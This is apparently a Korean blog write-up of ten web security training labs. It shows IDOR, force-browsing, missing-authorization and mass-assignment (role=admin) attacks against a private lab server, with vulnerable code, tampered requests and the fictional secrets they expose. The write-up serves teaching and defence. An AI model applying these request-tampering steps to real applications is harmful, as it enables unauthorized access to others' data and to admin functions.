---
title: "웹보안 및 모의해킹 Lab - Auth Labs (1) IDOR and Force Browsing"
date: 2026-03-20T18:00:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - Auth Labs
  - IDOR
  - Force Browsing
  - Missing Authorization
last_modified_at: 2026-03-26T18:00:00+09:00
published: true
---
## 문제

대상: `http://192.168.0.21:8080/vuln/auth/`

범위: `LAB1 ~ LAB10`

## 개요

이번 Auth Labs는 인증(Authentication), 인가(Authorization), 계정(Account) 처리에서 어떤 검증이 빠졌을 때 직접 객체 참조가 노출되거나 관리자 기능이 우회되는지를 확인하는 실습임

반복적으로 확인한 도구와 개념은 다음과 같다

- `DAST`: Burp Suite 같은 동적 분석 도구
- `SAST`: 소스코드 기준 정적 분석 도구
- `AAA`: Account, Authentication, Authorization

직접 객체 참조(IDOR), 강제 접근(Force Browsing), 관리자 API 노출, 미흡한 인가 검증처럼 가장 기본적이지만 실무에서도 자주 보이는 패턴을 먼저 정리함

## LAB1. IDOR - Hidden Post Access

### 개요

게시판 목록 API와 상세 조회 API가 분리되어 있고, 목록에서 숨겨진 게시글이 빠져 있어도 상세 조회 API에서는 별도 권한 검증 없이 열람 가능한 구조

### 문제 코드

```javascript
function loadBoard() {
    fetch('?action=list')
        .then(r => r.json())
        .then(data => {
            data.posts.forEach(post => {
                const tr = document.createElement('tr');
                tr.onclick = () => viewPost(post.id);
            });
        });
}

function viewPost(id) {
    fetch('?action=view&id=' + id)
        .then(r => r.json())
        .then(data => {
            const post = data.post;
        });
}
```

### 분석 포인트

- 목록은 `?action=list`
- 상세는 `?action=view&id=`
- 목록에서 보이지 않는 번호가 있어도, 상세 API는 `id`만 맞으면 그대로 반환함
- 즉 UI 숨김과 서버측 인가 검증이 분리되어 있고, 서버 검증이 빠져 있음

### 사용한 요청

```text
?action=view&id=4
```

### 응답

```json
{"success":true,"post":{"id":4,"title":"시스템 점검 내부 공유 (삭제됨)","content":"정기점검 일정: 매주 수요일 02:00-04:00\n\n■ 점검 대상 서버\n  - DB-MASTER: 192.168.10.50\n  - DB-SLAVE: 192.168.10.51\n  - APP-SERVER: 192.168.10.100\n\n■ 관리자 계정: sysadmin / Passw0rd!@#\n■ 백업 경로: /backup/daily/\n\n이 문서는 내부 공유용이며 열람 후 삭제 예정입니다.","author":"administrator","category":"내부","is_secret":0,"is_hidden":1,"created_at":"2024-01-18 02:00:00"}}
```

### 결과

```text
Passw0rd!@#
```

### 정리

삭제되거나 숨김 처리된 객체를 프론트 목록에서만 감추고, 상세 조회 API에서 인가를 하지 않으면 IDOR가 발생함

## LAB2. IDOR - User Profile

### 개요

프로필 조회 API가 현재 로그인 사용자 전용처럼 보이지만, `user_id` 파라미터를 바꾸면 다른 사용자의 프로필도 그대로 조회 가능한 구조

### 문제 코드

```javascript
var currentUserId = 25;

function loadProfile(uid) {
    fetch('?action=get_profile&user_id=' + uid)
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var p = data.profile;
        });
}
```

### 분석 포인트

- 프론트는 `currentUserId = 25`를 기준으로 내 프로필만 불러오는 것처럼 보임
- 그러나 실제 API는 `user_id`를 그대로 신뢰함
- 서버가 세션 사용자와 요청한 `user_id`의 일치 여부를 검증하지 않음

### 사용한 요청

```text
?action=get_profile&user_id=1
```

### 응답

```json
{"success":true,"profile":{"id":1,"username":"administrator","display_name":"관리자(랩용)","role":"user","created_at":"2026-03-23 03:34:04","email":"administrator@seculab.internal","phone":"010-9999-0001","department":"보안관리팀","position":"팀장","bio":"SecuLab 플랫폼 총괄 관리자","secret_note":"AWS 콘솔: https://console.aws.amazon.com\nAccess Key: AKIA52GPOBQCN7EXAMPLE\nSecret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}}
```

### 결과

```text
AKIA52GPOBQCN7EXAMPLE
```

### 정리

프로필 API가 `user_id`를 직접 객체 참조 키로 사용하면서도, 요청자가 그 객체를 볼 권한이 있는지 확인하지 않아 IDOR가 발생함

## LAB3. IDOR - Note Access

### 개요

메모 목록, 조회, 편집, 삭제 기능이 모두 `note_id` 중심으로 동작. 공개/비공개 여부와 사용자 소유권 검증이 누락된 구조

### 문제 코드

```javascript
function viewNote(noteId) {
    fetch('?action=get_note&note_id=' + noteId)
}

function editNote(noteId) {
    fetch('?action=get_note&note_id=' + noteId)
}

function saveNote() {
    fetch('?action=update_note', {
        method: 'POST',
        body: new URLSearchParams({
            note_id: currentNoteId,
            title: title,
            content: content
        }).toString()
    })
}
```

### 분석 포인트

- 조회와 수정 모두 `note_id`만 기준으로 동작함
- 프론트에는 내 메모만 보이더라도, API 자체는 다른 사용자 메모를 그대로 반환할 수 있음
- 비공개 메모라도 서버에서 `user_id` 검증이 빠지면 열람 가능함

### 사용한 요청

```text
?action=get_note&note_id=1
```

### 응답

```json
{"success":true,"note":{"id":1,"user_id":1,"title":"Internal API Credentials","content":"=== 내부 API 인증 정보 ===\n\nAPI Endpoint: https://api.seculab.internal/v2\nINTERNAL_API_TOKEN=seculab-hpe-2024-flag\n\n위 토큰은 외부 유출 금지.\n관리자 외 열람 불가.","is_private":1,"created_at":"2026-03-25 21:14:50","updated_at":"2026-03-25 21:14:50"}}
```

### 결과

```text
seculab-hpe-2024-flag
```

### 정리

비공개 메모 여부: 목록 표시용 메타데이터
실제 접근 통제: 서버 재검증 필요
검증 누락 시 전형적인 IDOR

## LAB4. IDOR - Order History

### 개요

주문 상세 API가 `order_id` 하나만 받아 다른 사용자의 주문도 그대로 반환하는 구조

### 문제 코드

```javascript
function loadOrders() {
    fetch('?action=list')
}

function viewOrder(orderId) {
    fetch('?action=view&order_id=' + orderId)
        .then(function (r) { return r.json(); })
        .then(function (data) {
            var o = data.order;
        });
}
```

### 사용한 요청

```text
action=view&order_id=1
```

### 응답

```json
{"success":true,"order":{"id":1,"user_id":1,"order_number":"ORD-2024-0001","product_name":"보안 관제 솔루션 라이선스","quantity":1,"amount":5000000,"status":"결제완료","shipping_address":"서울시 강남구 테헤란로 123 보안빌딩 5층","payment_info":"결제수단: 법인카드\n승인번호: 8847-2024-0312\n\n★ 내부 프로모션 코드: PROMO-VIP-INTERNAL-2024\n(해당 코드는 외부 유출 금지)","created_at":"2024-03-12 14:30:00"}}
```

### 결과

```text
PROMO-VIP-INTERNAL-2024
```

### 정리

`order_id`만 바꿔 다른 주문 조회 가능
의미: 서버 객체 소유권 검증 누락

## LAB5. IDOR - Internal Document

### 개요

문서 목록과 상세 문서 조회 API가 분리되어 있고, `doc_id`를 변경하면 다른 사용자의 기밀 문서도 그대로 반환하는 구조

### 문제 코드

```javascript
function loadDocuments() {
    fetch('?action=list')
}

function viewDocument(docId) {
    fetch('?action=view&doc_id=' + docId)
        .then(function (r) { return r.json(); })
        .then(function (data) {
            var doc = data.document;
        });
}
```

### 사용한 요청

```text
?action=view&doc_id=1
```

### 응답

```json
{"success":true,"document":{"id":1,"user_id":1,"title":"DB 접속 정보 (기밀)","content":"=== 데이터베이스 접속 정보 ===\n\nDB Host: db-master.seculab.internal\nDB Port: 3306\nDB Name: seculab_prod\nDB User: root\nDB Pass: DB-MASTER-PASS-2024!\n\n※ 본 문서는 기밀입니다.","is_confidential":1,"department":"인프라팀","created_at":"2026-03-25 06:40:39"}}
```

### 결과

```text
DB-MASTER-PASS-2024!
```

### 정리

문서가 기밀인지 여부를 화면 뱃지로만 처리하고, 서버에서 접근 권한을 재검증하지 않으면 기밀 문서도 단순 파라미터 변경으로 노출될 수 있음

## LAB6. Force Browsing - Admin Dashboard

### 개요

일반 사용자 화면에는 보이지 않지만, 소스코드 주석에 숨겨진 관리자 페이지 경로가 남아 있어 직접 접근 가능한 랩임

### 문제 코드

```html
<!-- 일반 사용자 대시보드 -->
<!-- TODO: 관리자 페이지 이동 /vuln/auth/lab6.php?page=admin 제거 필요 -->
```

### 분석 포인트

- 주석에서 관리자 페이지 경로가 직접 노출됨
- 메뉴나 버튼이 없더라도 경로만 알면 바로 접근 가능함
- 즉 숨김과 접근 통제가 분리되어 있고, 서버측 검증이 누락된 상태임

### 사용한 요청

```text
?page=admin
```

### 결과

```text
ADMIN-DASHBOARD-KEY-2024
```

### 정리

관리자 페이지를 UI에서만 숨기고 서버에서 권한을 확인하지 않으면 Force Browsing이 성립함. 주석, JS 변수, 레거시 링크는 이런 경로를 노출하는 흔한 힌트가 됨

## LAB7. Disabled Admin Button API

### 개요

직원 목록 화면에서 관리자 전용 버튼은 `disabled` 처리되어 있지만, 버튼에 실제 API 경로가 그대로 포함되어 있다

### 문제 코드

```javascript
data.employees.forEach(function (emp) {
    tr.innerHTML =
        '<button class="btn-detail" onclick="viewBasicDetail(' + emp.id + ')">기본 정보</button>' +
        '<button class="btn-admin-detail" disabled data-api="?action=admin_detail&emp_id=' + emp.id + '" title="관리자 전용 기능">직원 상세 조회</button>';
});
```

### 분석 포인트

- 버튼이 비활성화되어 있어도 `data-api`에 실제 호출 경로가 들어 있음
- 프론트에서 disabled는 단순 UI 상태일 뿐, 서버측 접근 제어가 아님
- API가 별도 인증 없이 동작하면 그대로 호출 가능함

### 사용한 요청

```text
?action=admin_detail&emp_id=1
```

### 응답

```json
{"success":true,"employee":{"id":1,"name":"김관리","department":"보안관리팀","position":"팀장","email":"admin@seculab.internal","phone":"010-9999-0001","salary":8000000,"secret_token":"ADMIN-FUNC-TOKEN-2024","created_at":"2026-03-25 06:43:09"}}
```

### 결과

```text
ADMIN-FUNC-TOKEN-2024
```

### 정리

비활성화 버튼: 단순 UI 처리
서버가 실제 요청에서 관리자 여부를 다시 확인하지 않으면 관리자 전용 API 그대로 노출됨

## LAB8. Admin API Missing Auth

### 개요

공지사항 시스템 소스 주석에는 관리자 API 목록이 남아 있고, 해당 API를 직접 호출 시 비공개 공지까지 그대로 조회 가능한 구조

### 문제 코드

```html
<!-- Admin Panel: ?action=admin_list, ?action=admin_create (POST), ?action=admin_update (POST) -->
```

### 사용한 요청

```text
http://192.168.0.21:8080/vuln/auth/lab8.php?action=admin_list
```

### 응답

```json
{"success":true,"notices":[{"id":6,"title":"[내부] 시스템 관리자 인증 정보","content":"=== 시스템 관리자 인증 정보 ===\n\nAdmin Console: https://admin.seculab.internal\nAuth Code: NOTICE-ADMIN-SECRET-2024\n\n※ 본 공지는 비공개 처리되어 있습니다.\n관리자만 열람 가능합니다.","author":"시스템관리자","is_visible":0,"is_pinned":0,"created_at":"2024-01-25 10:00:00"}]}
```

### 결과

```text
NOTICE-ADMIN-SECRET-2024
```

### 정리

관리자 API가 소스에 노출되어 있는 것도 문제지만, 더 큰 문제는 해당 API에 인증/인가 검증이 빠져 있었다는 점임

## LAB9. Role Change API

### 개요

프로필 수정 기능은 화면상 이름, 이메일, 전화번호, 소개만 수정하는 것처럼 보이지만, 실제 서버는 추가 파라미터를 그대로 받아 역할(role)까지 갱신하는 구조

### 문제 코드

```javascript
document.getElementById('btnSave').addEventListener('click', function(){
    var body = new URLSearchParams({
        display_name: document.getElementById('fName').value,
        email: document.getElementById('fEmail').value,
        phone: document.getElementById('fPhone').value,
        bio: document.getElementById('fBio').value
    });
    fetch('?action=update_profile', {
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:body.toString()
    });
});
```

### 분석 포인트

- 프론트에는 `role` 입력 필드가 없음
- 하지만 서버가 화이트리스트 방식으로 허용 필드를 제한하지 않으면, 추가 파라미터를 받아들일 수 있음
- 즉 “화면에 없으면 못 바꾼다”가 아니라 “요청에 넣을 수 있으면 서버가 어떻게 처리하는가”를 봐야 함

### 사용한 요청

초기 요청:

```http
POST /vuln/auth/lab9.php?action=update_profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

display_name=admin&email=asd&phone=asd&bio=asd
```

Burp에서 추가로 넣은 파라미터:

```text
role=admin
```

### 결과

권한 상승 후 관리자 정보 조회:

```json
{
  "admin_secret": "ROLE-ESCALATED-2024-KEY",
  "admin_panel": "https://admin.seculab.internal",
  "db_host": "db-master.seculab.internal",
  "message": "관리자 인증에 성공했습니다."
}
```

### 정리

Mass Assignment 또는 Hidden Parameter 성격의 취약점으로 볼 수 있음. 프론트에 없는 필드라도 서버가 그대로 반영하면 권한 상승으로 이어질 수 있음

## LAB10. Admin Export Access

### 개요

매출 통계 페이지 소스에 관리자용 export API 힌트가 남아 있었고, 직접 호출 시 내부 감사 코드까지 포함된 데이터가 그대로 반환되었음

### 문제 코드

```javascript
// var exportUrl = '?action=export_data';
```

### 사용한 요청

```text
?action=export_data
```

### 응답

```json
{"success":true,"export":[{"id":"8","product_name":"[시스템] 내부 감사 리포트","category":"내부","amount":"0","revenue":"0","sale_date":"2024-01-01","internal_note":"=== 내부 감사 인증 코드 ===\nEXPORT-BYPASS-DATA-2024\n\n이 코드는 관리자만 확인 가능합니다."}],"exported_at":"2026-03-25 06:59:27"}
```

### 결과

```text
EXPORT-BYPASS-DATA-2024
```

### 정리

주석 처리되었거나 UI에서 숨겨진 export 기능도 서버에서 권한 검증이 없다면 그대로 호출 가능함

## 정리

이번 구간에서 반복적으로 확인한 취약 패턴은 다음과 같음

- `IDOR`: `id`, `user_id`, `note_id`, `order_id`, `doc_id` 변경만으로 타인 객체 열람
- `Force Browsing`: 숨겨진 페이지를 직접 경로로 접근
- `Missing Authorization`: 관리자 API를 직접 호출
- `Mass Assignment`: 화면에 없는 파라미터를 서버가 그대로 반영

공통점은 모두 “프론트에서 숨기거나 제한한 것”을 “서버가 다시 검증하지 않았다”는 점임



